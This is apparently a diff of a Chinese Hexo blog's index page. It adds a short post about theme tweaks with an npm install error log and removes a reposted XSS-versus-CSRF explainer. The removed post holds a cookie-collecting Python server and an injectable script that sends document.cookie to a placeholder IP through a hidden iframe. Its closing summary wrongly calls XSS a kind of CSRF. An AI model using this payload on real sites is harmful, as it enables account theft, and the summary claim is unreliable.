@@ -168,6 +168,60 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-今日休整，简单修改样式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2017/02/06/今日休整，简单修改样式/">今日休整，简单修改样式</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2017/02/06/今日休整，简单修改样式/" class="archive-article-date">
+  	<time datetime="2017-02-06T06:53:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>如题，今日没有阅读到特别好的文章，简单记两笔。</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/77e455bfgy1fcgrmgfd9kj206d067mxg.jpg" alt=""></p>
+<p>首先，把Theme优化了一下，给头像图片以及文章DOM加了动画，不得不说Hexo还是非常友好的工具，二次开发比较方便，但是在npm install时出现了一些问题，暂时没有找到合适的解，现已上github发帖询问 <a href="https://github.com/sass/node-sass/issues/1884">https://github.com/sass/node-sass/issues/1884</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">npm ERR! node-sass@3.13.1 postinstall: `node scripts/bu</div><div class="line">npm ERR! Exit status 1</div><div class="line">npm ERR!</div><div class="line">npm ERR! Failed at the node-sass@3.13.1 postinstall scr</div><div class="line">npm ERR! Make sure you have the latest version of node.</div><div class="line">npm ERR! If you do, this is most likely a problem with</div><div class="line">npm ERR! not with npm itself.</div><div class="line">npm ERR! Tell the author that this fails on your system</div><div class="line">npm ERR!     node scripts/build.js</div><div class="line">npm ERR! You can get information on how to open an issu</div><div class="line">npm ERR!     npm bugs node-sass</div><div class="line">npm ERR! Or if that isn&apos;t available, you can get their</div><div class="line">npm ERR!     npm owner ls node-sass</div><div class="line">npm ERR! There is likely additional logging output abov</div><div class="line"></div><div class="line">npm ERR! Please include the following file with any sup</div><div class="line">npm ERR!     D:\nodejs\hexo\themes\yilia\npm-debug.log</div></pre></td></tr></table></figure>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2017/02/06/今日休整，简单修改样式/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-函数式编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -771,74 +825,6 @@
 
 
   
-    <article id="post-XSS和CSRF对比" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2017/01/19/XSS和CSRF对比/">XSS和CSRF对比</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2017/01/19/XSS和CSRF对比/" class="archive-article-date">
-  	<time datetime="2017-01-19T01:11:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>
-
-<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
-<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">&lt;!-- more --&gt;</div><div class="line"></div><div class="line"></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
-<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
-<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/19/XSS和CSRF对比/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/blog/page/2/">2</a><a class="extend next" rel="next" href="/blog/page/2/">Next &raquo;</a>
@@ -924,15 +910,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Vue</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络相关</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Vue</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -941,6 +923,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">css</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">网络相关</a>
               </li>
             
             <div class="clearfix"></div>
